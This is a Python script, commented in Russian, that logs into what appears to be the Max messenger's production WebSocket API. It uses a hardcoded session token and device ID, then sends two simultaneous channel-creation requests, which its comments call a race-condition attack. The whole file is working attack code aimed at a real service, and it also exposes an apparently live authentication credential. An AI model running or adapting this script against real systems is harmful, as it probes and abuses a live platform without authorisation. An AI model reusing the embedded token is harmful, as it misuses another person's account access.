import asyncio
import websockets
import json

# ==========================================
# 1. НАСТРОЙКИ (ВСТАВЬ СВОИ ДАННЫЕ СЮДА)
# ==========================================
WS_URL = "wss://ws-api.oneme.ru/websocket"
TOKEN = "An_Sx6HQ9HDiAhYbeeTQIzeyWg4Nb7-2I3R3eEEaYrUQtogNfVgCm7tG2roDhre3sXwdmxa4UfV7CBGbtcZIKEkSuIVnCliF2Y0nUchAAzE6tdULAsbBmgnByg_ETwZtMQLQTgIpbuq_Mu8EEfa1lcH6zU6Z-B6MiRJ5VGpvXK0C2HKDMm1qZ2XyKSgwKCO_rM5Admk174BqntbqXPP93wyE-Rg6_O2gKDn7dGAQa2lsntaF-bIpkwCjIcIN46UKz7BEdXIgXO_aSTWFb7YxNVJMxxSroXD0efgiSe94shQvioh8S0M917wzqk2c7OrgDUsVPDXjwv1RU0Vuq3f9_hN_a_4q40h2ytLByTsa778yMezfuYT6JFcql40GHvd_JWNA6GBm7w4cFdCe2_SIKW2fLLPIlhGKsSDJpa5pvxH6b9AadxCDCeSFmfRcqW7c-zMule8hp2gekC8NTBGE2rpzBDNItQOne8mvMmb8yCW4omIPYVMvRIBIrA8OkbEXuPvbC_yabpzuRhtY1MgfUdpuW8H1fRskRGMtf-tTaQtboNwAB3A6DRo-z612eck6Cj0fz2PgykDObiYzamw2PpxF104sQzEFf10_l_KoLf4wy6F2EPoRisy6fNrHY1BSvtGu9EAlEc8UrsG0BcV6F6kdRhCI_sHKtkFfmK6tzmhns8wXYnm07nPadjKi_SSoqqTvog4"
DEVICE_ID = "3c1550ae-434a-48f1-9360-e3ceace21773"

seq_counter = 0

async def send_packet(ws, opcode, payload, cmd=0):
    """Отправляет пакет в WebSocket."""
    global seq_counter
    seq_counter += 1
    packet = {
        "ver": 11,
        "cmd": cmd,
        "seq": seq_counter,
        "opcode": opcode,
        "payload": payload
    }
    await ws.send(json.dumps(packet))
    print(f"[->] Отправлен пакет (opcode={opcode}, seq={seq_counter})")
    return seq_counter

async def receive_packet(ws):
    """Читает ответ от сервера."""
    try:
        response = await asyncio.wait_for(ws.recv(), timeout=5.0)
        data = json.loads(response)
        print(f"[<-] Получен ответ (opcode={data.get('opcode')}, cmd={data.get('cmd')})")
        
        # Если сервер вернул ошибку, выводим её
        if data.get("cmd") == 3:
            print(f"[!] ОШИБКА СЕРВЕРА: {data.get('payload')}")
        return data
    except asyncio.TimeoutError:
        print("[-] Таймаут ожидания ответа.")
        return None
    except websockets.exceptions.ConnectionClosed:
        print("[-] Соединение закрыто.")
        return None

async def main():
    async with websockets.connect(
        WS_URL, 
        origin="https://web.max.ru",
        additional_headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0"}
    ) as ws:
        print("[*] Подключение установлено.")
        
        # 1. INIT (инициализация)
        print("[*] Шаг 1: Отправка INIT...")
        await send_packet(ws, 6, {
    "deviceId": DEVICE_ID,
    "userAgent": {
        "deviceType": "WEB",
        "locale": "ru_RU",
        "osVersion": "macOS",
        "deviceName": "vkmax Python",
        "headerUserAgent": "Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
        "deviceLocale": "ru-RU",
        "appVersion": "25.1.0",  # можно попробовать любую версию
        "screen": "1920x1080 1.0x",
        "timezone": "Europe/Moscow"
    }
})                                                                                                                                                                                                                                                                            
        await receive_packet(ws)
        
        # 2. LOGIN (авторизация)
        print("[*] Шаг 2: Отправка LOGIN...")
        await send_packet(ws, 19, {"token": TOKEN})
        resp = await receive_packet(ws)
        
        if not resp or resp.get("cmd") == 3:
            print("[!] Авторизация не удалась. Проверь токен.")
            return
        print("[+] Авторизация прошла успешно!")

        # 3. RACE CONDITION (Отправка двух запросов на создание канала)
        print("[*] Шаг 3: Запуск Race Condition...")
        
        # Опкод 77 (CHAT_OPERATION). Пейлоад для создания канала.
        payload_1 = {"op": "create", "title": "RaceTest_1", "type": "PUBLIC_CHANNEL"}
        payload_2 = {"op": "create", "title": "RaceTest_2", "type": "PUBLIC_CHANNEL"}
        
        # Создаем две задачи, которые выполнятся одновременно
        task1 = asyncio.create_task(send_packet(ws, 77, payload_1))
        task2 = asyncio.create_task(send_packet(ws, 77, payload_2))
        
        # Ждем, пока оба пакета уйдут
        seq1, seq2 = await asyncio.gather(task1, task2)
        print(f"[*] Оба запроса отправлены (seq: {seq1} и {seq2})")
        
        # Читаем ответы от сервера (если они будут)
        print("[*] Ожидание ответов от сервера...")
        for _ in range(3):
            await receive_packet(ws)

if __name__ == "__main__":
    asyncio.run(main())